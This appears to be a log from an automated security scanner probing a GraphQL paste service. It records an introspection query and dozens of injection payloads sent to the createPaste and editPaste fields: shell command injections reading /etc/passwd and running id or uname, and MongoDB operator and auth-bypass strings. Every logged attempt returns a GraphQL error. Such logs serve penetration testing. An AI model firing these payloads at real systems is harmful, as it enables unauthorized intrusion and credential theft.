2026-02-03 20:06:25,455 | INFO    | GraphQLClient        | -                              | introspection        | POST | success  |  0.514s | payload=[__schema] response=[{"data": {"__schema": {"queryType": {"name": "Query", "fields": [{"name": "pastes", "args": [{"name": "public", "type": {"name": "Boolean", "kind": "SCALAR", "ofType": null}}, {"name": "limit", "type"…]
2026-02-03 20:18:34,791 | INFO    | InjectionTester      | chain_pipe                     | createPaste.content  | POST | success  |  0.003s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 99}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,794 | INFO    | InjectionTester      | chain_and                      | createPaste.content  | POST | success  |  0.003s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 101}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:18:34,797 | INFO    | InjectionTester      | plain_cat_passwd               | createPaste.content  | POST | success  |  0.003s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 95}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,800 | INFO    | InjectionTester      | space_semicolon_cat            | createPaste.content  | POST | success  |  0.003s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,803 | INFO    | InjectionTester      | space_pipe_cat                 | createPaste.content  | POST | success  |  0.003s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,806 | INFO    | InjectionTester      | space_and_cat                  | createPaste.content  | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 98}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,808 | INFO    | InjectionTester      | mongo_ne_operator              | createPaste.content  | POST | success  |  0.002s | payload=[{"$ne": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$ne\": \"\"}\", public: true, title: \"test\") { id content title suc…]
2026-02-03 20:18:34,810 | INFO    | InjectionTester      | mongo_gt_operator              | createPaste.content  | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$gt\": \"\"}\", public: true, title: \"test\") { id content title suc…]
2026-02-03 20:18:34,812 | INFO    | InjectionTester      | mongo_gte_operator             | createPaste.content  | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$gte\": \"\"}\", public: true, title: \"test\") { id content title su…]
2026-02-03 20:18:34,814 | INFO    | InjectionTester      | mongo_lt_operator              | createPaste.content  | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$lt\": \"~\"}\", public: true, title: \"test\") { id content title su…]
2026-02-03 20:18:34,816 | INFO    | InjectionTester      | mongo_regex_all                | createPaste.content  | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$regex\": \".*\"}\", public: true, title: \"test\") { id content titl…]
2026-02-03 20:18:34,818 | INFO    | InjectionTester      | mongo_regex_admin              | createPaste.content  | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$regex\": \"^admin\"}\", public: true, title: \"test\") { id content …]
2026-02-03 20:18:34,820 | INFO    | InjectionTester      | mongo_in_operator              | createPaste.content  | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$in\": [\"admin\", \"root\", \"test\"]}\", public: true, title: \"tes…]
2026-02-03 20:18:34,822 | INFO    | InjectionTester      | mongo_nin_operator             | createPaste.content  | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$nin\": [\"impossible_value_xyz\"]}\", public: true, title: \"test\")…]
2026-02-03 20:18:34,824 | INFO    | InjectionTester      | mongo_exists_true              | createPaste.content  | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$exists\": true}\", public: true, title: \"test\") { id content title…]
2026-02-03 20:18:34,826 | INFO    | InjectionTester      | mongo_or_bypass                | createPaste.content  | POST | success  |  0.002s | payload=[{"$or": [{"": ""}, {"$gt": ""}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$or\": [{\"\": \"\"}, {\"$gt\": \"\"}]}\", public: true, title: \"tes…]
2026-02-03 20:18:34,829 | INFO    | InjectionTester      | mongo_where_true               | createPaste.content  | POST | success  |  0.003s | payload=[' || true || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 94}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,832 | INFO    | InjectionTester      | mongo_where_1_eq_1             | createPaste.content  | POST | success  |  0.003s | payload=[1' || '1'=='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 93}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,835 | INFO    | InjectionTester      | mongo_where_sleep              | createPaste.content  | POST | success  |  0.003s | payload=[';sleep(5000);'] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 95}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,839 | INFO    | InjectionTester      | mongo_where_this               | createPaste.content  | POST | success  |  0.003s | payload=[' || this.password || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 103}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:18:34,842 | INFO    | InjectionTester      | mongo_where_function           | createPaste.content  | POST | success  |  0.003s | payload=[';return true;var x='] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 101}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:18:34,845 | INFO    | InjectionTester      | mongo_where_tojsononeline      | createPaste.content  | POST | success  |  0.003s | payload=[' || tojsononeline(this) || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 109}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:18:34,847 | INFO    | InjectionTester      | graphql_nested_ne              | createPaste.content  | POST | success  |  0.002s | payload=[{"password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:56) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"{\"password\": {\"$ne\": \"\"}}\", public: true, title: \"test…]
2026-02-03 20:18:34,849 | INFO    | InjectionTester      | graphql_nested_gt              | createPaste.content  | POST | success  |  0.002s | payload=[{"password": {"$gt": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:56) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"{\"password\": {\"$gt\": \"\"}}\", public: true, title: \"test…]
2026-02-03 20:18:34,851 | INFO    | InjectionTester      | graphql_nested_regex           | createPaste.content  | POST | success  |  0.002s | payload=[{"username": {"$regex": ".*"}, "password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:56) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$ne\": \…]
2026-02-03 20:18:34,853 | INFO    | InjectionTester      | graphql_array_injection        | createPaste.content  | POST | success  |  0.002s | payload=[["admin", {"$gt": ""}]] response=[{"errors": [{"message": "Syntax Error GraphQL (1:53) Expected :, found String \", {\"\n\n1: mutation { createPaste(burn: true, content: \"[\"admin\", {\"$gt\": \"\"}]\", public: true, title: \"test\")…]
2026-02-03 20:18:34,855 | INFO    | InjectionTester      | auth_bypass_ne_empty           | createPaste.content  | POST | success  |  0.002s | payload=[{"$ne": null}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:48) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"{\"$ne\": null}\", public: true, title: \"test\") { id content title suc…]
2026-02-03 20:18:34,859 | INFO    | InjectionTester      | semicolon_id                   | createPaste.title    | POST | success  |  0.003s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 83}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,862 | INFO    | InjectionTester      | pipe_id                        | createPaste.title    | POST | success  |  0.003s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 83}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,865 | INFO    | InjectionTester      | double_pipe_id                 | createPaste.title    | POST | success  |  0.003s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 84}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,868 | INFO    | InjectionTester      | and_id                         | createPaste.title    | POST | success  |  0.003s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 85}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,872 | INFO    | InjectionTester      | semicolon_cat_passwd           | createPaste.title    | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 96}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,875 | INFO    | InjectionTester      | pipe_cat_passwd                | createPaste.title    | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 96}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,878 | INFO    | InjectionTester      | double_pipe_cat_passwd         | createPaste.title    | POST | success  |  0.003s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,882 | INFO    | InjectionTester      | and_cat_passwd                 | createPaste.title    | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 98}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,885 | INFO    | InjectionTester      | semicolon_uname                | createPaste.title    | POST | success  |  0.003s | payload=[;uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 89}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,888 | INFO    | InjectionTester      | pipe_uname                     | createPaste.title    | POST | success  |  0.003s | payload=[|uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 89}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,891 | INFO    | InjectionTester      | double_pipe_uname              | createPaste.title    | POST | success  |  0.003s | payload=[||uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 90}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,894 | INFO    | InjectionTester      | and_uname                      | createPaste.title    | POST | success  |  0.003s | payload=[&& uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 91}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,897 | INFO    | InjectionTester      | backtick_cat_passwd            | createPaste.title    | POST | success  |  0.003s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,900 | INFO    | InjectionTester      | backtick_id                    | createPaste.title    | POST | success  |  0.003s | payload=[`id`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 84}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,903 | INFO    | InjectionTester      | backtick_uname                 | createPaste.title    | POST | success  |  0.003s | payload=[`uname -a`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 90}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,906 | INFO    | InjectionTester      | dollar_cat_passwd              | createPaste.title    | POST | success  |  0.003s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 98}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,909 | INFO    | InjectionTester      | dollar_id                      | createPaste.title    | POST | success  |  0.003s | payload=[$(id)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 85}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,912 | INFO    | InjectionTester      | dollar_uname                   | createPaste.title    | POST | success  |  0.003s | payload=[$(uname -a)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 91}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,916 | INFO    | InjectionTester      | plain_uname                    | createPaste.title    | POST | success  |  0.003s | payload=[uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 88}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,919 | INFO    | InjectionTester      | chain_semicolon                | createPaste.title    | POST | success  |  0.003s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 99}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,922 | INFO    | InjectionTester      | chain_pipe                     | createPaste.title    | POST | success  |  0.003s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 99}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,925 | INFO    | InjectionTester      | chain_and                      | createPaste.title    | POST | success  |  0.003s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 101}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:18:34,928 | INFO    | InjectionTester      | plain_cat_passwd               | createPaste.title    | POST | success  |  0.003s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 95}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,932 | INFO    | InjectionTester      | space_semicolon_cat            | createPaste.title    | POST | success  |  0.003s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,935 | INFO    | InjectionTester      | space_pipe_cat                 | createPaste.title    | POST | success  |  0.003s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 97}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,938 | INFO    | InjectionTester      | space_and_cat                  | createPaste.title    | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 98}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,940 | INFO    | InjectionTester      | mongo_ne_operator              | createPaste.title    | POST | success  |  0.002s | payload=[{"$ne": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$ne\": \"\"}\") { id content title suc…]
2026-02-03 20:18:34,943 | INFO    | InjectionTester      | mongo_gt_operator              | createPaste.title    | POST | success  |  0.002s | payload=[{"$gt": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$gt\": \"\"}\") { id content title suc…]
2026-02-03 20:18:34,944 | INFO    | InjectionTester      | mongo_gte_operator             | createPaste.title    | POST | success  |  0.002s | payload=[{"$gte": ""}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$gte\": \"\"}\") { id content title su…]
2026-02-03 20:18:34,947 | INFO    | InjectionTester      | mongo_lt_operator              | createPaste.title    | POST | success  |  0.002s | payload=[{"$lt": "~"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$lt\": \"~\"}\") { id content title su…]
2026-02-03 20:18:34,948 | INFO    | InjectionTester      | mongo_regex_all                | createPaste.title    | POST | success  |  0.002s | payload=[{"$regex": ".*"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$regex\": \".*\"}\") { id content titl…]
2026-02-03 20:18:34,950 | INFO    | InjectionTester      | mongo_regex_admin              | createPaste.title    | POST | success  |  0.002s | payload=[{"$regex": "^admin"}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$regex\": \"^admin\"}\") { id content …]
2026-02-03 20:18:34,952 | INFO    | InjectionTester      | mongo_in_operator              | createPaste.title    | POST | success  |  0.002s | payload=[{"$in": ["admin", "root", "test"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$in\": [\"admin\", \"root\", \"test\"]…]
2026-02-03 20:18:34,955 | INFO    | InjectionTester      | mongo_nin_operator             | createPaste.title    | POST | success  |  0.002s | payload=[{"$nin": ["impossible_value_xyz"]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$nin\": [\"impossible_value_xyz\"]}\")…]
2026-02-03 20:18:34,957 | INFO    | InjectionTester      | mongo_exists_true              | createPaste.title    | POST | success  |  0.002s | payload=[{"$exists": true}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$exists\": true}\") { id content title…]
2026-02-03 20:18:34,958 | INFO    | InjectionTester      | mongo_or_bypass                | createPaste.title    | POST | success  |  0.002s | payload=[{"$or": [{"": ""}, {"$gt": ""}]}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$or\": [{\"\": \"\"}, {\"$gt\": \"\"}]…]
2026-02-03 20:18:34,961 | INFO    | InjectionTester      | mongo_where_true               | createPaste.title    | POST | success  |  0.003s | payload=[' || true || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 94}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,964 | INFO    | InjectionTester      | mongo_where_1_eq_1             | createPaste.title    | POST | success  |  0.003s | payload=[1' || '1'=='1] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 93}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,967 | INFO    | InjectionTester      | mongo_where_sleep              | createPaste.title    | POST | success  |  0.003s | payload=[';sleep(5000);'] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 95}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locatio…]
2026-02-03 20:18:34,971 | INFO    | InjectionTester      | mongo_where_this               | createPaste.title    | POST | success  |  0.003s | payload=[' || this.password || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 103}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:18:34,974 | INFO    | InjectionTester      | mongo_where_function           | createPaste.title    | POST | success  |  0.003s | payload=[';return true;var x='] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 101}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:18:34,977 | INFO    | InjectionTester      | mongo_where_tojsononeline      | createPaste.title    | POST | success  |  0.003s | payload=[' || tojsononeline(this) || '] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"CreatePaste\".", "locations": [{"line": 1, "column": 109}]}, {"message": "Cannot query field \"content\" on type \"CreatePaste\".", "locati…]
2026-02-03 20:18:34,979 | INFO    | InjectionTester      | graphql_nested_ne              | createPaste.title    | POST | success  |  0.002s | payload=[{"password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:85) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"password\": {\"$ne\": \"\"}}…]
2026-02-03 20:18:34,981 | INFO    | InjectionTester      | graphql_nested_gt              | createPaste.title    | POST | success  |  0.002s | payload=[{"password": {"$gt": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:85) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"password\": {\"$gt\": \"\"}}…]
2026-02-03 20:18:34,983 | INFO    | InjectionTester      | graphql_nested_regex           | createPaste.title    | POST | success  |  0.002s | payload=[{"username": {"$regex": ".*"}, "password": {"$ne": ""}}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:85) Expected :, found String \": {\"\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"username\": {\"$regex\": \".…]
2026-02-03 20:18:34,986 | INFO    | InjectionTester      | graphql_array_injection        | createPaste.title    | POST | success  |  0.002s | payload=[["admin", {"$gt": ""}]] response=[{"errors": [{"message": "Syntax Error GraphQL (1:82) Expected :, found String \", {\"\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"[\"admin\", {\"$gt\": \"\"}]\")…]
2026-02-03 20:18:34,988 | INFO    | InjectionTester      | auth_bypass_ne_empty           | createPaste.title    | POST | success  |  0.002s | payload=[{"$ne": null}] response=[{"errors": [{"message": "Syntax Error GraphQL (1:77) Expected Name, found $\n\n1: mutation { createPaste(burn: true, content: \"test\", public: true, title: \"{\"$ne\": null}\") { id content title suc…]
2026-02-03 20:18:34,990 | INFO    | InjectionTester      | semicolon_id                   | editPaste.content    | POST | success  |  0.003s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 62}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:34,993 | INFO    | InjectionTester      | pipe_id                        | editPaste.content    | POST | success  |  0.003s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 62}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:34,996 | INFO    | InjectionTester      | double_pipe_id                 | editPaste.content    | POST | success  |  0.003s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 63}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:34,999 | INFO    | InjectionTester      | and_id                         | editPaste.content    | POST | success  |  0.003s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 64}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,003 | INFO    | InjectionTester      | semicolon_cat_passwd           | editPaste.content    | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 75}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,006 | INFO    | InjectionTester      | pipe_cat_passwd                | editPaste.content    | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 75}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
2026-02-03 20:18:35,009 | INFO    | InjectionTester      | double_pipe_cat_passwd         | editPaste.content    | POST | success  |  0.003s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"EditPaste\".", "locations": [{"line": 1, "column": 76}]}, {"message": "Cannot query field \"message\" on type \"EditPaste\".", "locations":…]
